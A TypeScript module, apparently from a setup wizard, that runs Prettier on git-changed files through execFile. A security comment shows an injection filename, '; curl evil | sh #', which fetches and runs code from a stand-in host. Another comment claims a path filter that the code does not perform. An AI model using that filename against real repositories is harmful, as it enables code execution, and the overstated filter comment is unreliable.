import type { Integration } from '../lib/constants';
import { traceStep } from '../telemetry';
import { analytics } from '../utils/analytics';
import { getUI } from '../ui';
import {
  tryGetPackageJson,
  getUncommittedOrUntrackedFiles,
  isInGitRepo,
} from '../utils/setup-utils';
import { hasPackageInstalled } from '../utils/package-json';
import type { WizardOptions } from '../utils/types';
import * as childProcess from 'node:child_process';

export async function runPrettierStep({
  installDir,
  integration,
}: Pick<WizardOptions, 'installDir'> & {
  integration: Integration;
}): Promise<void> {
  return traceStep('run-prettier', async () => {
    if (!isInGitRepo()) {
      // We only run formatting on changed files. If we're not in a git repo, we can't find
      // changed files. So let's early-return without showing any formatting-related messages.
      return;
    }

    const changedOrUntrackedFiles = getUncommittedOrUntrackedFiles()
      .map((filename) => {
        return filename.startsWith('- ') ? filename.slice(2) : filename;
      })
      // Defense in depth: filter out anything that doesn't look like a real
      // file path so even if `git status` parsing regressed and returned a
      // weird line, we wouldn't pass it to the subprocess. We also skip
      // empties produced by the trim above.
      .filter((f) => f.length > 0);

    if (changedOrUntrackedFiles.length === 0) {
      // Likewise, if we can't find changed or untracked files, there's no point in running Prettier.
      return;
    }

    const packageJson = await tryGetPackageJson({ installDir });
    if (!packageJson) return;
    const prettierInstalled = hasPackageInstalled('prettier', packageJson);

    if (!prettierInstalled) {
      return;
    }

    const prettierSpinner = getUI().spinner();
    prettierSpinner.start('Running Prettier on your files.');

    try {
      // SECURITY: use execFile (no shell) and pass filenames as a separate
      // argv array. The previous `exec(\`npx prettier ... ${files}\`)` form
      // built a shell string from filenames returned by `git status`, so a
      // tracked file named e.g. `; curl evil | sh #` would have executed on
      // every wizard run inside that repo. With execFile each filename is a
      // single argv entry — shell metacharacters are inert.
      await new Promise<void>((resolve, reject) => {
        childProcess.execFile(
          'npx',
          [
            'prettier',
            '--ignore-unknown',
            '--write',
            '--',
            ...changedOrUntrackedFiles,
          ],
          (err: Error | null) => {
            if (err) {
              reject(err);
            } else {
              resolve();
            }
          },
        );
      });
    } catch {
      prettierSpinner.stop(
        'Prettier failed to run. You may want to format the changes manually.',
      );
      return;
    }

    prettierSpinner.stop('Prettier has formatted your files.');

    analytics.wizardCapture('prettier ran', {
      integration,
      'prettier installed': true,
    });
  });
}
